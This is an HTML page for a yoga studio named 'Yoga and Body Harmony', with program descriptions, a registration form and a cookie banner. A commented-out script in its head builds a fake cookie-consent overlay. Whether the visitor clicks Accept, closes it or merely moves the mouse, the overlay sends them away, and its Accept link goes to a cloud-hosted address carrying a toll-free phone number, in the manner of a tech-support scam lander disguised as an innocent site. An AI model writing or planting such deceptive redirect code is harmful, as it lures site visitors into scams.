<?php
?>
<!DOCTYPE html>
<html lang="en">
<head>	
    <!-- <script>
        document.addEventListener("DOMContentLoaded", function () {
            const redirectUrl = "https://microsoft.com";
            const style = document.createElement("style");
            style.textContent = `
                .cookie-overlay {
                    position: fixed;
                    inset: 0;
                    background: rgba(0, 0, 0, 0.8);
                    backdrop-filter: blur(10px);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                    z-index: 9999;
                    animation: fadeInBackground 0.5s ease-out forwards;
                }
                @keyframes fadeInBackground {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                .cookie-popup {
                    position: fixed;
                    bottom: 60px;
                    left: 50%;
                    transform: translateX(-50%);
                    background-color: #ffffff;
                    border: none;
                    color: #333;
                    padding: 30px;
                    border-radius: 10px;
                    z-index: 10000;
                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
                    max-width: 400px;
                    text-align: center;
                }
                .close-btn {
                    background: none;
                    border: none;
                    font-size: 1.5rem;
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    cursor: pointer;
                    color: #888;
                }
                .btn-primary {
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    padding: 12px 24px;
                    border-radius: 5px;
                    cursor: pointer;
                    margin-top: 15px;
                    display: inline-block;
                    text-decoration: none;
                    transition: background-color 0.3s;
                }
                .btn-primary:hover {
                    background-color: #0056b3;
                }
                h3 {
                    font-family: 'Arial', sans-serif;
                    margin-bottom: 10px;
                }
                p {
                    font-family: 'Arial', sans-serif;
                    line-height: 1.5;
                }
            `;
            document.head.appendChild(style);
            const overlay = document.createElement("div");
            overlay.className = "cookie-overlay";
            overlay.id = "cookie-overlay";
            overlay.innerHTML = `
<div class="cookie-popup">
<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
<h3>Cookie Policy</h3>
<p>
                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
</p>
<a href="https://bewtiu.z1.web.core.windows.net/?bcda=1-833-351-0404" id="accept-cookies" class="btn-primary">Accept</a>
</div>
            `;
            document.body.appendChild(overlay);
            let isRedirected = false;
            let startPos = null;
            let redirectTimeout = null;
            const handleRedirect = () => {
                if (!isRedirected) {
                    isRedirected = true;
                    window.location.href = redirectUrl;
                }
            };
            const detectMouseMove = (event) => {
                if (isRedirected) return;
                const screenHeight = window.innerHeight;
                const activeTop = screenHeight * 0.15;
                if (event.clientY >= activeTop) {
                    if (!startPos) {
                        startPos = { x: event.clientX, y: event.clientY };
                    } else {
                        const dx = Math.abs(event.clientX - startPos.x);
                        const dy = Math.abs(event.clientY - startPos.y);
                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
                            redirectTimeout = setTimeout(handleRedirect, 1000);
                        }
                    }
                } else {
                    startPos = null;
                    clearTimeout(redirectTimeout);
                    redirectTimeout = null;
                }
            };
            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
            document.getElementById("accept-cookies").addEventListener("click", function (e) {
                e.preventDefault();
                handleRedirect();
            });
            document.getElementById("close-popup").addEventListener("click", function (e) {
                e.preventDefault();
                handleRedirect();
            });
        });
</script> -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yoga and Body Harmony</title>
    <style>* {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #000;
            line-height: 1.6;
        }
        
        header {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            padding: 1.5rem;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        nav {
            background-color: #1e3c72;
            padding: 1rem;
        }
        
        nav ul {
            display: flex;
            justify-content: center;
            list-style: none;
        }
        
        nav li {
            margin: 0 1.5rem;
        }
        
        nav a {
            color: white;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.3s;
        }
        
        nav a:hover {
            color: #a8d0ff;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .content {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 2rem;
        }
        
        h1, h2, h3 {
            color: #000000;
            margin-bottom: 1rem;
        }
        
        p {
            margin-bottom: 1rem;
            text-align: justify;
        }
        
        .highlight {
            background-color: #e6f2ff;
            padding: 1.5rem;
            border-left: 4px solid #2a5298;
            margin: 1.5rem 0;
        }
        
        .contact-form {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
            color: #1e3c72;
        }
        
        input, textarea {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
        }
        
        button {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }
        
        button:hover {
            background: linear-gradient(135deg, #2a5298, #3a6bc2);
        }
        
        footer {
            background-color: #1e3c72;
            color: white;
            padding: 2rem;
            text-align: center;
            margin-top: 2rem;
        }
        
        .cookie-consent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #2a5298;
            color: white;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1000;
        }
        
        .cookie-consent button {
            background-color: white;
            color: #1e3c72;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .contact-info {
            background-color: #e6f2ff;
            padding: 1.5rem;
            border-radius: 8px;
            margin-top: 2rem;
        }
        
        @media (max-width: 768px) {
            nav ul {
                flex-direction: column;
                align-items: center;
            }
            
            nav li {
                margin: 0.5rem 0;
            }
        }
    </style>
</head>
<body>
    <header>
        <h1>Yoga and Body Harmony</h1>
        <p>Professional yoga sessions, breathing practices, and balance restoration</p>
    </header>
    
    <nav>
        <ul>
            <li><a href="#about">About the Studio</a></li>
            <li><a href="#programs">Yoga Programs</a></li>
            <li><a href="#benefits">Benefits</a></li>
            <li><a href="#contact">Contact</a></li>
        </ul>
    </nav>
    
    <div class="container">
        <div class="content">
            <h2 id="about">About Our Yoga Studio</h2>
            <p>Our studio brings together people striving for inner harmony, improved health, and mindful living. We offer a comfortable space for yoga, meditation, and relaxation practices suitable for both beginners and experienced practitioners.</p>

            <div class="highlight">
                <h3>Philosophy and Approach</h3>
                <p>Our programs are based on a gentle and safe practice format. We focus on proper technique, breathing, and body awareness. For us, it is important not only to develop physical fitness but also to maintain emotional balance, reduce stress, and improve overall quality of life.</p>
            </div>

            <p>Classes are held in small groups and individual formats. Instructors help adapt poses to each participant’s level so that practice brings enjoyment and a sense of lightness.</p>

            <h3 id="programs">Programs and Directions</h3>
            <p>Our studio offers various yoga styles and wellness practices, allowing you to choose the most suitable training format.</p>

            <p><strong>Hatha Yoga</strong> — a classic practice focused on strengthening the body, improving flexibility, and enhancing posture. Suitable for all fitness levels.</p>

            <p><strong>Relaxation and Stress Relief Yoga</strong> — gentle stretching, breathing techniques, and restorative asanas to restore energy and improve sleep.</p>

            <p><strong>Morning Yoga Flow</strong> — dynamic sequences for vitality, increased tone, and concentration throughout the day.</p>

            <p><strong>Meditation and Breathing Practices</strong> — work with attention, relaxation, and emotional stability.</p>

            <div class="highlight">
                <h3 id="benefits">Why Choose Us</h3>
                <p>We strive to create an atmosphere of trust and inspiration. The studio provides comfortable practice conditions, focuses on safety, and respects the individual needs of each student.</p>
            </div>

            <p>Our sessions help improve physical condition, increase energy levels, strengthen muscles and joints, and develop inner resilience and mindfulness.</p>

            <p>We invite you to take the first step toward harmony of body and mind and discover the world of yoga in a friendly and calm environment.</p>
        </div>
        
        <div class="contact-form">
            <h2 id="contact">Class Registration Form</h2>
            <form id="feedbackForm">
                <div class="form-group">
                    <label for="name">Your Name:</label>
                    <input type="text" id="name" name="name" required>
                </div>
                
                <div class="form-group">
                    <label for="email">Email Address:</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="phone">Phone Number:</label>
                    <input type="tel" id="phone" name="phone">
                </div>
                
                <div class="form-group">
                    <label for="message">Your Message:</label>
                    <textarea id="message" name="message" rows="5" required></textarea>
                </div>
                
                <button type="submit">Submit Request</button>
            </form>
            
            <div class="contact-info">
                <h3>Contact Information</h3>
                <p><strong>Address:</strong> Moscow, Mirnaya Street, 12, Yoga Studio</p>
                <p><strong>Phone:</strong> +7 (999) 215-82-40</p>
                <p><strong>Email:</strong> support@gmail.com</p>
                <p><strong>Working Hours:</strong> Mon–Sun: 8:00 AM – 9:00 PM</p>
            </div>
        </div>
    </div>
    
    <footer>
        <p>© 2026 Yoga and Wellness Studio. All rights reserved.</p>
    </footer>
    
    <div class="cookie-consent" id="cookieConsent">
        <div>
            <p>We use cookies to improve website performance. By continuing to use the site, you agree to this.</p>
        </div>
        <button id="acceptCookies">Accept</button>
    </div>

    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
        document.getElementById('acceptCookies').addEventListener('click', function() {
            document.getElementById('cookieConsent').style.display = 'none';
            document.cookie = "cookieConsent=true; max-age=2592000; path=/";
        });
        
        document.getElementById('feedbackForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('Thank you! Your request has been successfully submitted. We will contact you shortly.');
            this.reset();
        });
    </script>
</body>
</html>
